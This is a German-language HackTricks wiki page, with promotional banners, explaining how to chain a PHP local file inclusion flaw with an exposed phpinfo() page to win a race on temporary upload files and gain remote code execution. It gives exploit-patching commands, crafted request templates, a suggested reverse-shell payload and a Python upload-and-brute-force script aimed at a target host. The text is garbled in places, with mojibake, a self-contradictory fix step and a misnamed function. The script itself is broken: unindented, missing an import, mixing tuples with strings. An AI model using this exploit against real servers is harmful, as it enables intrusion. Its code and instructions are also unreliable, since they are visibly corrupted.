<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


Um diese Schwachstelle auszunutzen, ben√∂tigen Sie: **Eine LFI-Schwachstelle, eine Seite, auf der phpinfo() angezeigt wird, "file\_uploads = on" und der Server muss in der Lage sein, in das Verzeichnis "/tmp" zu schreiben.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Sie m√ºssen den Exploit beheben (√§ndern Sie **=>** in **=>**). Dazu k√∂nnen Sie Folgendes tun:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Du musst auch das **Payload** am Anfang des Exploits √§ndern (zum Beispiel f√ºr eine php-rev-shell), das **REQ1** (das auf die phpinfo-Seite zeigen sollte und das Padding enthalten sollte, z.B.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), und **LFIREQ** (das auf die LFI-Schwachstelle zeigen sollte, z.B.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ √úberpr√ºfe das doppelte "%" beim Ausnutzen des Nullzeichens)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Theorie

Wenn Uploads in PHP erlaubt sind und du versuchst, eine Datei hochzuladen, wird diese Datei in einem tempor√§ren Verzeichnis gespeichert, bis der Server die Anfrage abgeschlossen hat. Anschlie√üend wird diese tempor√§re Datei gel√∂scht.

Dann, wenn du eine LFI-Schwachstelle im Webserver gefunden hast, kannst du versuchen, den Namen der erstellten tempor√§ren Datei zu erraten und eine RCE auszunutzen, indem du auf die tempor√§re Datei zugreifst, bevor sie gel√∂scht wird.

Unter **Windows** werden die Dateien normalerweise in **C:\Windows\temp\php** gespeichert.

Unter **Linux** ist der Name der Datei normalerweise **zuf√§llig** und befindet sich in **/tmp**. Da der Name zuf√§llig ist, muss der Name der tempor√§ren Datei **aus irgendeiner Quelle extrahiert werden** und darauf zugegriffen werden, bevor sie gel√∂scht wird. Dies kann geschehen, indem der Wert der **Variable $\_FILES** im Inhalt der Funktion "**phpconfig()**" gelesen wird.

**phpinfo()**

**PHP** verwendet einen Puffer von **4096B** und wenn dieser **voll** ist, wird er an den Client **gesendet**. Dann kann der Client **viele gro√üe Anfragen** (mit gro√üen Headern) **hochladen einer php** Reverse **Shell**, auf die **erste Teil der phpinfo() wartet**, der zur√ºckgegeben wird (wo der Name der tempor√§ren Datei steht) und versucht, auf die Tempor√§rdatei zuzugreifen, bevor der PHP-Server die Datei l√∂scht, indem er eine LFI-Schwachstelle ausnutzt.

**Python-Skript zum Versuch des Brute-Forcing des Namens (wenn die L√§nge 6 betr√§gt)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
